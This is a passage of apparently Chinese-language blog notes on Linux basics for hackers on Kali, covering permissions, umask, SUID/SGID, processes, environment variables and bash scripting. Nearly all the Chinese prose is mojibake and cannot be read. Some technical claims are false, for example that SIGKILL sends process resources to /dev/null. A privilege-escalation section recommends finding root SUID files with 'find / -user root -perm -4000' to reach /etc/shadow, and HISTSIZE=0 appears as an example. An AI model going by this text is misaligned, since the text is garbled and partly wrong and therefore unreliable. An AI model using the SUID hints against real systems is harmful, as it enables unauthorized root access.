</span><br><span class="line">Â­rw-r--r-- <span class="number"> 1 </span> root  root<span class="number"> 33685504 </span>June<span class="number"> 28 </span>2018 hashcat.hcstat </span><br><span class="line">Â­rw-r--r-- <span class="number"> 1 </span> root  root<span class="number"> 33685504 </span>June<span class="number"> 28 </span>2018 hashcat.hctune </span><br><span class="line">drwxr -xr-x<span class="number"> 2 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 masks </span><br><span class="line">drwxr -xr-x<span class="number"> 2 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 OpenCL </span><br><span class="line">drwxr -xr-x<span class="number"> 3 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 rules</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå­—ç¬¦å‘Šè¯‰æ‚¨æ–‡ä»¶ç±»å‹ï¼Œå…¶ä¸­ d ä»£è¡¨ç›®å½•ï¼ŒçŸ­åˆ’çº¿ï¼ˆ - ï¼‰è¡¨ç¤ºæ–‡ä»¶ã€‚<br>ä¸‹ä¸€èŠ‚å®šä¹‰æ–‡ä»¶çš„æƒé™ã€‚æœ‰ä¸‰ç»„ ä¸‰ä¸ª å­—ç¬¦ï¼Œç”± readï¼ˆrï¼‰ï¼Œ writeï¼ˆwï¼‰å’Œ executeï¼ˆxï¼‰çš„æŸç§ç»„åˆæŒ‰é¡º åºç»„æˆã€‚</p><p>ç¬¬ä¸€ç»„ä»£è¡¨æ‰€æœ‰è€…çš„æƒé™ï¼Œç¬¬äºŒç»„ä»£è¡¨ç”¨æˆ·æ‰€åœ¨ç»„çš„æƒé™ä»¥åŠæœ€åä¸€ä¸ªï¼Œæ‰€æœ‰å…¶ä»–ç”¨æˆ·çš„æƒé™ã€‚ </p><p>æ— è®ºæ‚¨æ­£åœ¨æŸ¥çœ‹å“ªä¸€ç»„ä¸‰ä¸ªå­—æ¯ï¼Œå¦‚æœæ‚¨é¦–å…ˆçœ‹åˆ° rï¼Œè¯¥ç”¨æˆ·æˆ–ç”¨æˆ·ç»„éƒ½æœ‰æƒæ‰“å¼€å’Œè¯»å–è¯¥æ–‡ä»¶æˆ–ç›®å½•ã€‚ ä½œä¸ºä¸­é—´å­—æ¯çš„ w æ„å‘³ç€å®ƒä»¬å¯ä»¥å†™å…¥ï¼ˆä¿®æ”¹ï¼‰æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¹¶ä¸”æœ€åçš„ x æ„å‘³ç€å®ƒä»¬å¯ä»¥æ‰§è¡Œï¼ˆæˆ–è¿è¡Œï¼‰ æ–‡ä»¶æˆ–ç›®å½•ã€‚å¦‚æœç”¨çŸ­åˆ’çº¿ï¼ˆ - ï¼‰æ›¿æ¢ä»»ä½• rï¼Œw æˆ– xï¼Œåˆ™æœªç»™å‡ºç›¸åº”çš„æƒé™ã€‚</p><table><thead><tr><th>äºŒè¿›åˆ¶</th><th>åè¿›åˆ¶</th><th>æƒé™(rwx)</th></tr></thead><tbody><tr><td>000</td><td>0</td><td>â€”</td></tr><tr><td>001</td><td>1</td><td>â€“x</td></tr><tr><td>010</td><td>2</td><td>-w-</td></tr><tr><td>011</td><td>3</td><td>-wx</td></tr><tr><td>100</td><td>4</td><td>râ€“</td></tr><tr><td>101</td><td>5</td><td>r-x</td></tr><tr><td>110</td><td>6</td><td>rw-</td></tr><tr><td>111</td><td>7</td><td>rwx</td></tr></tbody></table><p>chmod  774  hashcat.hcsta    æ›´æ”¹æ–‡ä»¶æƒé™ï¼ˆ7 æ–‡ä»¶æ‰€æœ‰è€…æƒé™  7 æ–‡ä»¶æ‰€æœ‰è€…æ‰€åœ¨ç»„æƒé™ 4å…¶ä»–æ‰€æœ‰ç”¨æˆ·æƒé™ ï¼‰</p><h3 id="UGOè¯­æ³•ï¼š"><a href="#UGOè¯­æ³•ï¼š" class="headerlink" title="UGOè¯­æ³•ï¼š"></a>UGOè¯­æ³•ï¼š</h3><p>è¾“å…¥ chmod å‘½ä»¤ï¼Œç„¶åè¾“å…¥è¦æ›´æ”¹æƒé™çš„ç”¨æˆ·ï¼Œä¸ºç”¨æˆ·æä¾› uï¼Œä¸ºç»„æä¾› gï¼Œä¸º å…¶ä»–ç”¨æˆ·æä¾› oï¼Œæˆ–è€…è¾“å…¥ä¸‰ä¸ªè¿ç®—ç¬¦ä¹‹ä¸€ï¼š </p><p>-     ç§»é™¤ä¸€ä¸ªæƒé™ </p><p>+    æ·»åŠ ä¸€ä¸ªæƒé™ </p><p>=    è®¾ç½®ä¸€ä¸ªæƒé™ </p><p>åœ¨æ“ä½œç¬¦ä¹‹åï¼ŒåŒ…æ‹¬è¦æ·»åŠ æˆ–åˆ é™¤çš„æƒé™ï¼ˆrwxï¼‰ï¼Œæœ€ååŒ…å«è¦åº”ç”¨å®ƒçš„æ–‡ä»¶çš„åç§°ã€‚ </p><p>ä¾‹ï¼š</p><p>chmod  u-w  hashcat.hcstat         åˆ é™¤ç”¨æˆ·å¯¹ hashcat.hcstat æ‰€å±æ–‡ä»¶çš„å†™å…¥æƒé™</p><p>chmod u+x, o+x hashcat.hcstat     åŒæ—¶ä¸ºç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·ï¼ˆä¸åŒ…æ‹¬ç»„ï¼‰æˆäºˆæ‰§è¡Œæƒé™</p><p>Linux è‡ªåŠ¨åˆ†é…åŸºæœ¬æƒé™ï¼ˆé€šå¸¸ä¸ºæ–‡ä»¶ 666 å’Œç›®å½• 777ï¼‰ã€‚</p><p>umask æ–¹æ³•è¡¨ç¤ºè¦ä»æ–‡ä»¶æˆ–ç›®å½•çš„åŸºæœ¬æƒé™ä¸­åˆ é™¤ çš„æƒé™ï¼Œä»¥ä½¿å…¶æ›´å®‰å…¨ã€‚ </p><p>å½“åˆ›å»ºæ–°æ–‡ä»¶æˆ–ç›®å½•æ—¶ï¼Œå®ƒæƒé™è®¾ç½®ä¸ºé»˜è®¤å€¼å‡å» umask ä¸­çš„å€¼</p><p>ä¸å¤§å¤šæ•° Debian ç³»ç»Ÿä¸€æ ·ï¼Œumask é¢„å…ˆé…ç½®ä¸º 022ï¼Œè¿™æ„å‘³ç€ Kali é»˜è®¤å€¼ä¸º 644ï¼Œæ–‡ä»¶ä¸º 755ï¼Œç›®å½•ä¸º 755ã€‚ </p><h3 id="umask"><a href="#umask" class="headerlink" title="umask"></a>umask</h3><p>umask å€¼å¯¹äºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç”¨æˆ·éƒ½ä¸æ˜¯é€šç”¨çš„ã€‚æ¯ä¸ªç”¨æˆ·éƒ½å¯ä»¥ä¸ºå…¶ä¸ªäºº.profile æ–‡ä»¶ä¸­çš„æ–‡ä»¶å’Œç›®å½• è®¾ç½®ä¸ªäººé»˜è®¤ umask å€¼ã€‚è¦ä»¥ç”¨æˆ·èº«ä»½ç™»å½•æ—¶æŸ¥çœ‹å½“å‰å€¼ï¼Œåªéœ€è¾“å…¥å‘½ä»¤ umask å¹¶è®°ä¸‹è¿”å›çš„å†…å®¹ã€‚è¦æ›´ æ”¹ç”¨æˆ·çš„ umask å€¼ï¼Œè¯·ç¼–è¾‘è¯¥æ–‡ä»¶/home/username/.profileï¼Œä¾‹å¦‚ï¼Œæ·»åŠ  umask 007 è¿›è¡Œè®¾ç½®ï¼Œä»¥ä¾¿åªæœ‰æ‰€æœ‰è€…å’Œç”¨æˆ·ç»„çš„æˆå‘˜æ‰å…·æœ‰æƒé™ã€‚ </p><h3 id="ç‰¹åˆ«æƒé™ï¼š"><a href="#ç‰¹åˆ«æƒé™ï¼š" class="headerlink" title="ç‰¹åˆ«æƒé™ï¼š"></a>ç‰¹åˆ«æƒé™ï¼š</h3><p>è®¾ç½®ç”¨æˆ· IDï¼ˆæˆ– SUIDï¼‰ï¼Œ è®¾ç½®ç»„ IDï¼ˆæˆ– SGIDï¼‰</p><h4 id="ä½¿ç”¨-SUIDæˆäºˆä¸´æ—¶-rootæƒé™"><a href="#ä½¿ç”¨-SUIDæˆäºˆä¸´æ—¶-rootæƒé™" class="headerlink" title="ä½¿ç”¨ SUIDæˆäºˆä¸´æ—¶ rootæƒé™"></a>ä½¿ç”¨ SUIDæˆäºˆä¸´æ—¶ rootæƒé™</h4><p>æ­£å¦‚æ‚¨ç°åœ¨åº”è¯¥çŸ¥é“çš„é‚£æ ·ï¼Œç”¨æˆ·åªæœ‰åœ¨æœ‰æƒæ‰§è¡Œè¯¥ç‰¹å®šæ–‡ä»¶æ—¶æ‰èƒ½æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚å¦‚æœç”¨æˆ·åªå…·æœ‰è¯» å–å’Œï¼ˆæˆ–ï¼‰å†™å…¥æƒé™ï¼Œåˆ™æ— æ³•æ‰§è¡Œã€‚è¿™å¯èƒ½çœ‹èµ·æ¥å¾ˆç®€å•ï¼Œä½†è¿™æ¡è§„åˆ™æœ‰ä¾‹å¤–ã€‚<br>ä½ å¯èƒ½é‡åˆ°è¿‡è¿™æ ·ä¸€ç§æƒ…å†µï¼šæ–‡ä»¶åœ¨è¢«æ‰€æœ‰ç”¨æˆ·ï¼ˆå³ä½¿é root ç”¨æˆ·ï¼‰æ‰§è¡ŒæœŸé—´éƒ½éœ€è¦ root ç”¨æˆ·çš„æƒé™ã€‚ ä¾‹å¦‚ï¼Œå…è®¸ç”¨æˆ·æ›´æ”¹å…¶å¯†ç çš„æ–‡ä»¶éœ€è¦è®¿é—®/etc/shadowï¼ˆLinux ä¸­ä¿å­˜ç”¨æˆ·å¯†ç çš„æ–‡ä»¶ï¼‰ï¼Œè¯¥æ–‡ä»¶éœ€è¦ root ç”¨æˆ·æƒé™æ‰èƒ½æ‰§è¡Œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé€šè¿‡åœ¨ç¨‹åºä¸Šè®¾ç½® SUID ä½ï¼Œå¯ä»¥ä¸´æ—¶æˆäºˆæ‰€æœ‰è€…æ‰§è¡Œæ–‡ä»¶æ‰€éœ€çš„ç‰¹æƒã€‚<br>åŸºæœ¬ä¸Šï¼ŒSUID ä½è¡¨ç¤ºä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨æ‰€æœ‰è€…çš„æƒé™æ¥æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œä½†è¿™äº›æƒé™ä¸ä¼šè¶…å‡ºä½¿ç”¨è¯¥æ–‡ ä»¶çš„èŒƒå›´ã€‚<br>è¦è®¾ç½® SUID ä½ï¼Œè¯·åœ¨å¸¸è§„æƒé™ä¹‹å‰è¾“å…¥ 4ï¼Œå› æ­¤å½“è®¾ç½® SUID ä½æ—¶ï¼Œå…·æœ‰ 644 çš„æ–°ç»“æœæƒé™çš„æ–‡ä»¶è¡¨ç¤ºä¸º 4644</p><h4 id="ä½¿ç”¨-SGIDæˆäºˆ-Rootç”¨æˆ·ç»„æƒé™"><a href="#ä½¿ç”¨-SGIDæˆäºˆ-Rootç”¨æˆ·ç»„æƒé™" class="headerlink" title="ä½¿ç”¨ SGIDæˆäºˆ Rootç”¨æˆ·ç»„æƒé™"></a>ä½¿ç”¨ SGIDæˆäºˆ Rootç”¨æˆ·ç»„æƒé™</h4><p>SGID æˆäºˆä¸´æ—¶æƒé™ï¼Œä½†å®ƒæˆäºˆæ–‡ä»¶æ‰€æœ‰è€…ç»„çš„æƒé™ï¼Œè€Œä¸æ˜¯æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ã€‚è¿™æ„å‘³ç€ï¼Œè®¾ç½® SGID ä½ï¼Œå¦‚æœç”¨æˆ·ç»„æœ‰æƒæ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œæ²¡æœ‰æ‰§è¡Œæƒé™çš„äººä¹Ÿå¯ä»¥æ‰§è¡Œæ–‡ä»¶ã€‚<br>åº”ç”¨äºç›®å½•æ—¶ï¼ŒSGID ä½çš„å·¥ä½œæ–¹å¼ç•¥æœ‰ä¸åŒï¼šå½“è¯¥ä½ç½®ä½æ—¶åœ¨ç›®å½•ä¸­ï¼Œåœ¨è¯¥ç›®å½•ä¸­åˆ›å»ºçš„æ–°æ–‡ä»¶çš„æ‰€æœ‰æƒå°†è½¬åˆ°ç›®å½•åˆ›å»ºè€…çš„ç»„ï¼Œè€Œä¸æ˜¯æ–‡ä»¶åˆ›å»ºè€…çš„ç»„ã€‚å½“å¤šä¸ªç”¨æˆ·å…±äº«ç›®å½•æ—¶ï¼Œè¿™éå¸¸æœ‰ç”¨ã€‚è¯¥ç»„ä¸­çš„æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œä¸ä»…ä»…æ˜¯å•ä¸ªç”¨æˆ·ã€‚<br>SGID ä½åœ¨å¸¸è§„æƒé™ä¹‹å‰è¡¨ç¤ºä¸º 2ï¼Œå› æ­¤å½“ SGID ä½ç½®ä½æ—¶ï¼Œå…·æœ‰ç»“æœæƒé™ 644 çš„æ–°æ–‡ä»¶å°†è¡¨ç¤ºä¸º 2644ã€‚<br>åŒæ ·ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ chmod å‘½ä»¤ï¼ˆä¾‹å¦‚ï¼Œchmod 2644 filenameï¼‰ ã€‚ </p><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>ä½œä¸ºé»‘å®¢ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç‰¹åˆ«æƒé™è·å–ä¸´æ—¶ root æƒé™å¹¶æ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚è®¿é—®/etc/shadow ä¸­çš„å¯†ç ã€‚ </p><p>åœ¨æ–‡ä»¶ç³»ç»Ÿçš„ä»»ä½•ä½ç½®æŸ¥æ‰¾å¯¹äº root ç”¨æˆ·æˆ–å…¶ä»– sysadminï¼Œå…·æœ‰æƒé™ 4000ï¼ˆ SUID ä½ï¼‰çš„æ–‡ä»¶ã€‚</p><p>find  /  -user  root  -perm  -4000</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;cd  /usr/bin </span><br><span class="line">kali &gt;ls  -l </span><br><span class="line">Â­rwxr-xr-x <span class="number">1</span>  root  root  <span class="number">176272</span> Jul <span class="number">18</span> <span class="number">2018</span> stunnel4 </span><br><span class="line">Â­rwxr-xr-x <span class="number">1</span>  root  root   <span class="number">26696</span> Mar <span class="number">17</span> <span class="number">2018</span> sucrack </span><br><span class="line">âŠ-rwsr-xr-x <span class="number">1</span>  root root  <span class="number">140944</span> Jul <span class="number">5</span>  <span class="number">2018</span> sudo</span><br></pre></td></tr></table></figure><p> è¯·æ³¨æ„âŠï¼Œæ‰€æœ‰è€…çš„ç¬¬ä¸€ç»„æƒé™ï¼ˆå…·æœ‰ s ä»£æ›¿ xï¼‰ã€‚è¿™å°±æ˜¯ Linux è¡¨ç¤º SUID ä½å·²è®¾ç½®çš„æ–¹å¼ã€‚è¿™æ„å‘³ç€ ä»»ä½•äººè·‘sudoæ–‡ä»¶å…·æœ‰rootç”¨æˆ·çš„æƒé™ï¼Œè¿™å¯èƒ½æ˜¯ç³»ç»Ÿç®¡ç†å‘˜çš„å®‰å…¨é—®é¢˜ï¼Œä¹Ÿå¯èƒ½æ˜¯é»‘å®¢çš„æ½œåœ¨æ”»å‡»åª’ä»‹ã€‚ </p><h2 id="è¿›ç¨‹ç®¡ç†"><a href="#è¿›ç¨‹ç®¡ç†" class="headerlink" title="è¿›ç¨‹ç®¡ç†"></a>è¿›ç¨‹ç®¡ç†</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>æŸ¥çœ‹è¿›ç¨‹</p><p>USER  è¿›ç¨‹ç”¨æˆ·<br>PID   è¿›ç¨‹ id<br>%CPU  CPU å ç”¨ç‡<br>75<br>%MEM  è¿›ç¨‹ CPU å ç”¨ç‡<br>COMMAND è¿›ç¨‹å</p><p>é€šå¸¸ï¼Œè¦å¯¹è¿›ç¨‹æ‰§è¡Œä»»ä½•æ“ä½œï¼Œæˆ‘ä»¬å¿…é¡»æŒ‡å®šå…¶ PIDã€‚</p><p>é€šè¿‡è¿›ç¨‹åè¿‡æ»¤è¿›ç¨‹</p><p>ä¾‹ï¼š    ps  aux  |  grep  msfconsole </p><h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>æŒ‰ä½¿ç”¨çš„èµ„æºæ’åºçš„è¿›ç¨‹æ˜¾ç¤º ï¼Œä»æœ€å¤§çš„è¿›ç¨‹å¼€å§‹ã€‚ä¸ ps å‘½ä»¤ä¸åŒçš„æ˜¯ï¼Œtop å‘½ä»¤æ¯ 10 ç§’åŠ¨æ€åˆ·æ–°ä¸€æ¬¡åˆ—è¡¨ï¼Œ è€Œ ps å‘½ä»¤åªæä¾›ä¸€æ¬¡è¿›ç¨‹å¿«ç…§ã€‚</p><h3 id="nice"><a href="#nice" class="headerlink" title="nice"></a>nice</h3><p>åœ¨è¿è¡Œè¿›ç¨‹æ—¶è®¾ç½®ä¼˜å…ˆçº§ </p><p>ä¾‹ï¼šnice -n  -10  /bin/slowprocess </p><p>é«˜ nice å€¼ä¸ºä½ä¼˜å…ˆçº§ï¼Œä½ nice å€¼ä¸ºé«˜ä¼˜å…ˆçº§</p><p>è¿›ç¨‹çš„æ‰€æœ‰è€…å¯ä»¥é™ä½è¿›ç¨‹çš„ ä¼˜å…ˆçº§ï¼Œä½†ä¸èƒ½å¢åŠ å…¶ä¼˜å…ˆçº§ã€‚å½“ç„¶ï¼Œè¶…çº§ç”¨æˆ·æˆ–æ ¹ç”¨æˆ·å¯ä»¥éšæ„å°† nice å€¼è®¾ç½®ä¸ºä»–ä»¬å–œæ¬¢çš„ä»»ä½•å€¼ã€‚ </p><h3 id="renice"><a href="#renice" class="headerlink" title="renice"></a>renice</h3><p>ä¾‹ï¼šrenice  20  [PID]6996             </p><p>ä¸ nice ä¸€æ ·ï¼Œåªæœ‰ root ç”¨æˆ·å¯ä»¥å°†è¿›ç¨‹é‡æ–°è®¾ç½®ä¸ºè´Ÿå€¼ä»¥èµ‹äºˆå…¶æ›´é«˜çš„ä¼˜å…ˆçº§ï¼Œä½†ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ ç”¨ renice æ¥é™ä½ä¼˜å…ˆçº§ã€‚ </p><h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p>å‘½ä»¤ï¼škill -signal PID</p><p>SIGHUP 1<br>è¿™ç§°ä¸ºæŒ‚èµ·ï¼ˆHUPï¼‰æ ‡å¿—ä¿¡å·ã€‚å®ƒä¼šåœ æ­¢æŒ‡å®šçš„è¿›ç¨‹å¹¶ä½¿ç”¨ç›¸åŒçš„PIDé‡æ–°å¯ åŠ¨å®ƒã€‚<br>SIGINT 2<br>è¿™æ˜¯ä¸­æ–­ï¼ˆINTï¼‰ä¿¡å·ã€‚è¿™æ˜¯ä¸€ä¸ªå¼±ä¿¡ å·ï¼Œä¸èƒ½ä¿è¯å·¥ä½œï¼Œä½†å®ƒåœ¨å¤§å¤šæ•°æƒ… å†µä¸‹éƒ½æœ‰æ•ˆã€‚<br>SIGQUIT 3<br>è¿™ç§°ä¸ºæ ¸å¿ƒè½¬å‚¨ã€‚å®ƒç»ˆæ­¢è¿›ç¨‹å¹¶å°†è¿› ç¨‹ä¿¡æ¯ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œç„¶åå°†æ­¤ä¿¡æ¯ ä¿å­˜åœ¨å½“å‰å·¥ä½œç›®å½•ä¸­çš„ä¸€ä¸ªåä¸º core çš„æ–‡ä»¶ä¸­ã€‚ï¼ˆè¿™æ ·åšçš„åŸå› è¶…å‡º äº†æœ¬ä¹¦çš„èŒƒå›´ã€‚ï¼‰<br>SIGTERM 15<br>è¿™æ˜¯ç»ˆæ­¢ï¼ˆTERMï¼‰ä¿¡å·ã€‚è¿™æ˜¯ kill å‘½ä»¤çš„é»˜è®¤ kill ä¿¡å·ã€‚<br>SIGKILL 9<br>è¿™æ˜¯å¼ºåˆ¶ç»ˆæ­¢ä¿¡å·ã€‚å®ƒé€šè¿‡å°†è¿›ç¨‹çš„ èµ„æºå‘é€åˆ°ç‰¹æ®Šä½ç½®/dev/null æ¥å¼º åˆ¶è¿›ç¨‹åœæ­¢ã€‚<br>ä½¿</p><p>å¦‚æœæ‚¨ä¸çŸ¥é“è¿›ç¨‹çš„ PIDï¼Œåˆ™å¯ä»¥ä½¿ç”¨ killall å‘½ä»¤ç»ˆæ­¢è¿›ç¨‹ã€‚æ­¤å‘½ä»¤å°†è¿›ç¨‹çš„åç§°ï¼ˆè€Œä¸æ˜¯ PIDï¼‰ä½œä¸ºå‚ æ•°ã€‚</p><h3 id="åœ¨åå°è¿è¡Œè¿›ç¨‹"><a href="#åœ¨åå°è¿è¡Œè¿›ç¨‹" class="headerlink" title="åœ¨åå°è¿è¡Œè¿›ç¨‹"></a>åœ¨åå°è¿è¡Œè¿›ç¨‹</h3><p>è¦åœ¨åå°å¯åŠ¨è¿›ç¨‹ï¼Œåªéœ€åœ¨å‘½ä»¤æœ«å°¾æ·»åŠ ä¸€ä¸ªä¸å·ï¼ˆï¼†ï¼‰ï¼Œ</p><p>ä¾‹:    leafpad  newscript  &amp; </p><h3 id="æŠŠåå°è¿è¡Œçš„è¿›ç¨‹ç§»åˆ°å‰å°"><a href="#æŠŠåå°è¿è¡Œçš„è¿›ç¨‹ç§»åˆ°å‰å°" class="headerlink" title="æŠŠåå°è¿è¡Œçš„è¿›ç¨‹ç§»åˆ°å‰å°"></a>æŠŠåå°è¿è¡Œçš„è¿›ç¨‹ç§»åˆ°å‰å°</h3><p>å‘½ä»¤ï¼šfg PID</p><h3 id="å®šæ—¶æ‰§è¡Œç¨‹åº"><a href="#å®šæ—¶æ‰§è¡Œç¨‹åº" class="headerlink" title="å®šæ—¶æ‰§è¡Œç¨‹åº"></a>å®šæ—¶æ‰§è¡Œç¨‹åº</h3><p><strong>at</strong></p><p>å½“æ‚¨ä½¿ç”¨æŒ‡å®šçš„æ—¶é—´è¿›å…¥ at å®ˆæŠ¤è¿›ç¨‹æ—¶ï¼Œè¿›å…¥äº¤äº’æ¨¡å¼æ—¶ï¼Œæ‚¨ä¼šçœ‹åˆ° at&gt;æç¤ºç¬¦ã€‚æ‚¨å¯ä»¥åœ¨æ­¤å¤„è¾“å…¥ è¦åœ¨æŒ‡å®šæ—¶é—´æ‰§è¡Œçš„å‘½ä»¤ï¼š </p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;<span class="keyword">at</span>  <span class="number">7</span>:<span class="number">20</span>am </span><br><span class="line"><span class="keyword">at</span> &gt;/root/myscanningscript</span><br></pre></td></tr></table></figure><p>at å‘½ä»¤æ˜¯å®ˆæŠ¤è¿›ç¨‹ï¼ˆåå°è¿›ç¨‹ï¼‰å¯¹äºå°†ä½œä¸šå®‰æ’åœ¨å°†æ¥çš„æŸä¸ªæ—¶åˆ»è¿è¡Œä¸€æ¬¡éå¸¸æœ‰ç”¨ã€‚</p><p>crond æ›´é€‚åˆäº å®‰æ’ä»»åŠ¡æ¯å¤©ï¼Œæ¯å‘¨æˆ–æ¯æœˆå‘ç”Ÿã€‚</p><h3 id="ç®¡ç†ç”¨æˆ·ç¯å¢ƒå˜é‡"><a href="#ç®¡ç†ç”¨æˆ·ç¯å¢ƒå˜é‡" class="headerlink" title="ç®¡ç†ç”¨æˆ·ç¯å¢ƒå˜é‡"></a>ç®¡ç†ç”¨æˆ·ç¯å¢ƒå˜é‡</h3><p>env    æŸ¥çœ‹æ‰€æœ‰é»˜è®¤ç¯å¢ƒå˜é‡</p><p>set | more     è¦æŸ¥çœ‹æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼ŒåŒ…æ‹¬ shell å˜é‡ã€æœ¬åœ°å˜é‡å’Œ shell å‡½æ•°(å¦‚ä»»ä½•ç”¨æˆ·å®šä¹‰çš„å˜é‡å’Œå‘½ä»¤åˆ«å)</p><p>set | grep HISTSIZE     ç‰¹å®šå˜é‡çš„è¿‡æ»¤</p><p>HISTSIZE=0     æš‚æ—¶æ›´æ”¹ä¼šè¯çš„å˜é‡å€¼</p><p>export HISTSIZE     æ°¸ä¹…æ›´æ”¹ä¼šè¯çš„å˜é‡å€¼ï¼ˆæ›´æ”¹å exportï¼‰</p><p>æ‰¾ç‚¹ä¹å­ï¼š</p><p>â€‹        PS1=â€Worldâ€™s Best Hacker: #â€ </p><p>â€‹        export PS1 </p><p>PS1 å˜é‡æœ‰ä¸€ç»„å ä½ç¬¦ï¼Œç”¨äºæ˜¾ç¤ºå¸Œ æœ›åœ¨æç¤ºç¬¦ä¸­æ˜¾ç¤ºçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä»¥ä¸‹å†…å®¹: \u  å½“å‰ç”¨æˆ·çš„åç§° \h  ä¸»æœºå \W  å½“å‰å·¥ä½œç›®å½•çš„åŸºæœ¬åç§° </p><h3 id="æ·»åŠ åˆ°PATHå˜é‡"><a href="#æ·»åŠ åˆ°PATHå˜é‡" class="headerlink" title="æ·»åŠ åˆ°PATHå˜é‡"></a>æ·»åŠ åˆ°PATHå˜é‡</h3><p>PATH=$PATH:/root/newhackingtool </p><h3 id="åˆ›å»ºç”¨æˆ·å®šä¹‰çš„å˜é‡"><a href="#åˆ›å»ºç”¨æˆ·å®šä¹‰çš„å˜é‡" class="headerlink" title="åˆ›å»ºç”¨æˆ·å®šä¹‰çš„å˜é‡"></a>åˆ›å»ºç”¨æˆ·å®šä¹‰çš„å˜é‡</h3><p>è¯­æ³•å¾ˆç®€å•ï¼šè¾“å…¥å˜é‡çš„åç§°ï¼Œåé¢è·Ÿç€èµ‹å€¼ç¬¦å·(=)ï¼Œç„¶åè¾“å…¥å˜é‡çš„å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤º: </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;MYNEWVARIABLE=<span class="comment">"Hacking is the most valuable skill set in the 21st century</span></span><br><span class="line">kali &gt;<span class="keyword">echo</span> $MYNEWVARIABLE </span><br><span class="line">Hacking <span class="keyword">is</span> the most valuable skill <span class="keyword">set</span> in the <span class="number">21</span><span class="keyword">st</span> century</span><br></pre></td></tr></table></figure><p>å°±åƒæˆ‘ä»¬çš„ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸€æ ·ï¼Œå¿…é¡»å¯¼å‡ºç”¨æˆ·å®šä¹‰çš„å˜é‡æ‰èƒ½å°†å…¶æŒä¹…åŒ–åˆ°æ–°çš„ä¼šè¯ä¸­ã€‚ </p><p>å¦‚æœè¦åˆ é™¤è¿™ä¸ªæ–°å˜é‡æˆ–ä»»ä½•å˜é‡ï¼Œè¯·ä½¿ç”¨ unset å‘½ä»¤ã€‚ä¸è¿‡ï¼Œåœ¨åˆ é™¤ç³»ç»Ÿå˜é‡ä¹‹å‰ä¸€å®šè¦ä¸‰æ€ï¼Œå›  ä¸ºä¹‹åç³»ç»Ÿçš„æ“ä½œå¯èƒ½ä¼šå¤§ä¸ç›¸åŒã€‚ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;<span class="built_in">unset</span> MYNEWVARIABLE </span><br><span class="line">kali &gt;<span class="built_in">echo</span> <span class="variable">$MYNEWVARIABLE</span> </span><br><span class="line">kali &gt;</span><br></pre></td></tr></table></figure><p>å¦‚æ‚¨æ‰€è§ï¼Œå½“æ‚¨è¾“å…¥ unset  MYNEWVARIABLE æ—¶ï¼Œæ‚¨å°†åˆ é™¤è¯¥å˜é‡åŠå…¶å€¼ã€‚å¦‚æœåœ¨åŒä¸€ä¸ªå˜é‡ä¸Šä½¿ç”¨ echoï¼ŒLinux ç°åœ¨å°†è¿”å›ç©ºè¡Œã€‚</p><h2 id="ç®€å•BASH-è„šæœ¬ç¼–ç¨‹"><a href="#ç®€å•BASH-è„šæœ¬ç¼–ç¨‹" class="headerlink" title="ç®€å•BASH è„šæœ¬ç¼–ç¨‹"></a>ç®€å•BASH è„šæœ¬ç¼–ç¨‹</h2><p>#!        å‘Šè¯‰æ‚¨çš„æ“ä½œç³»ç»Ÿæ‚¨æƒ³ä¸ºè„šæœ¬ä½¿ç”¨å“ªä¸ªè§£é‡Šå™¨ã€‚</p><p>ç„¶åæŒ‰ç…§æŒ‡ç¤ºçš„ (#!/bin/bash)æ“ä½œç³»ç»Ÿä½¿ç”¨ bash shell è§£é‡Šå™¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">âŠ <span class="comment">#! /bin/bash </span></span><br><span class="line"> </span><br><span class="line">â‹ <span class="comment"># This is your second bash script. In this one, you prompt /  </span></span><br><span class="line"><span class="comment"># the user for input, place the input in a variable, and / </span></span><br><span class="line"><span class="comment"># display the variable contents in a string. </span></span><br><span class="line"> </span><br><span class="line">âŒ <span class="built_in">echo</span> <span class="string">"What is your name?"</span>  </span><br><span class="line"><span class="built_in">read</span> name </span><br><span 